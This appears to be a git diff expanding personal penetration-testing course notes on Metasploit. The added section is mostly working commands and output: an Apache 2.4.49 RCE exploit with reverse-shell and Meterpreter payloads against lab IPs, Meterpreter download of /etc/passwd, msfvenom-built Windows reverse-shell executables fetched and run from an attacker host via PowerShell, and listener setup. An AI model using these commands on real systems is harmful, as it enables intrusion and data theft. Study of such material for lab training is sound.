@@ -1771,7 +1771,7 @@ Reference
 
 ### 21. The metassploit framework  
 **Getting familiar with Metasploit**
-- Creating and initializing the Metasploit database  
+- **Creating and initializing the Metasploit database**  
   `sudo msfdb init`
 - Enable postgresql database service  
   `sudo systemctl enable postgresql`
@@ -1785,7 +1785,7 @@ Reference
   `msf6 > db_nmap -A 192.168.50.202` `msf6 > hosts` `msf6 > services` `msf6 > services -p 8000`
 - help flag for the command 'show'  
   `show -h`
-- List all auxiliary modules  
+- **List all auxiliary modules**  
   `msf6 > show auxiliary`
 - Search all SMB auxiliary modules in Metasploit > 56  auxiliary/scanner/smb/smb_version    
   `msf6 > search type:auxiliary smb`
@@ -1811,9 +1811,107 @@ Reference
   run
   creds
   ```
-- ddd
-- ddd
-- ddd
+- **Create a new workspace and search for Apache 2.4.49 modules** >  0  exploit/multi/http/apache_normalize_path_rc  
+  `msf6 auxiliary(scanner/ssh/ssh_login) > workspace -a exploits`  
+  `msf6 auxiliary(scanner/ssh/ssh_login) > search Apache 2.4.49`  
+  `msf6 auxiliary(scanner/ssh/ssh_login) > use 0`
+- set payload of the exploit module > Payload options (linux/x64/meterpreter/reverse_tcp)  
+  `msf6 exploit(multi/http/apache_normalize_path_rce) > show options`  
+  `msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/shell_reverse_tcp`
+- Metasploit automatically sets up a listener  
+- Running the exploit module > Command shell session 2 opened (192.168.119.4:4444 -> 192.168.50.16:35534)   
+  ```
+  set SSL false
+  set RPORT 80
+  set RHOSTS 192.168.50.16
+  run
+  ```
+- Backgrounding a session and listing all currently active sessions > 2 shell x64/linux  
+  `Background session 2? [y/N]  y`  
+  `msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -l`  
+- Interact with the previously backgrounded session  
+  `msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 2`  
+  `uname -a`
+
+**Using metasploit payloads**
+- **Non-Staged Payloads** (Inline Payloads): These payloads are sent in their entirety along with the exploit. E.g linux/x64/shell_reverse_tcp  
+- **Staged Payloads**: These are delivered in two parts. The first stage is a small payload sent initially that causes the target to connect back to the attacker. Then, the second stage—a larger payload containing the main shellcode—is transferred and executed on the target machine. E.g linux/x64/shell/reverse_tcp  
+- Show payloads  
+  `msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads`
+- Use staged TCP reverse shell payload and launch exploit module > 15 payload/linux/x64/shell/reverse_tcp  
+  `msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 15` `run`
+- **Use Meterpreter non-staged payload/linux/x64/meterpreter_reverse_tcp**  
+  ```
+  msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 11
+  msf6 exploit(multi/http/apache_normalize_path_rce) > run
+  meterpreter > sysinfo
+  meterpreter > getuid
+  meterpreter > shell
+  id
+  Ctrl+Z
+  Background channel 1? [y/N] y 
+  ```
+- start a second interactive shell, execute command and background the channel  
+  ```
+  meterpreter > shell
+  Process 196 created.
+  Channel 2 created.
+  whoami
+  daemon
+  ^Z
+  Background channel 2? [y/N]  y
+  ```
+- List all active channels and interact with channel 1  
+  ```
+  meterpreter > channel -l
+  meterpreter > channel -i 1
+  ```
+- Use 'download' command in meterpreter  
+  ```
+  meterpreter > help  
+  meterpreter > lpwd  //print local working directory  
+  meterpreter > lcd /home/kali/Downloads //change local working directory
+  meterpreter > download /etc/passwd //download a file or directory
+  meterpreter > lcat /home/kali/Downloads/passwd // Read the contents of a local file to the screen
+  meterpreter > upload /usr/bin/unix-privesc-check /tmp/  // Upload a file or directory
+  meterpreter > ls /tmp //list files
+
+  meterpreter > exit
+  ```        
+- **Use non-staged meterpreter payload/linux/x64/meterpreter_reverse_https**  
+  ```
+  msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 10  
+  msf6 exploit(multi/http/apache_normalize_path_rce) > run  
+  ```
+- **msfvenom** is a standalone command-line tool that is part of the Metasploit Framework used to generate and encode various types of payloads for penetration testing
+- Listing a Windows executable with a reverse shell payload  > windows/x64/shell_reverse_tcp  
+  `kali@kali:~$ msfvenom -l payloads --platform windows --arch x64`
+- Creating a Windows executable with a non-staged TCP reverse shell payload  
+  `kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe`
+- `kali@kali:~$ nc -nvlp 443`  
+- Download non-staged payload binary and execute it  
+  `PS C:\Users\justin> iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe`  
+  `PS C:\Users\justin> .\nonstaged.exe`
+  output: C:\Users\justin>
+- Creating a Windows executable with a staged TCP reverse shell payload  
+  `kali@kali:~$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe`
+  repeat the steps above...
+  output: whoami //cannot execute any commands because netcat dunno how to handle a staged payload  
+- use Metasploit's multi/handler to handle staged, non-staged interactive command prompt  
+  ```
+  msf6 exploit(multi/http/apache_normalize_path_rce) > use multi/handler
+  msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
+  msf6 exploit(multi/handler) > set LHOST 192.168.119.2
+  msf6 exploit(multi/handler) > set LPORT 443
+  msf6 exploit(multi/handler) > run
+
+  output: C:\Users\justin> whoami
+  
+  C:\Users\justin> exit
+  msf6 exploit(multi/handler) > run -j
+  msf6 exploit(multi/handler) > jobs
+  ```
+- ddd 
 ### 22. Active directory introduction and enumeration
 ### 23. Attacking active drectiory authentication
 ### 24. Lateral movement in active directory
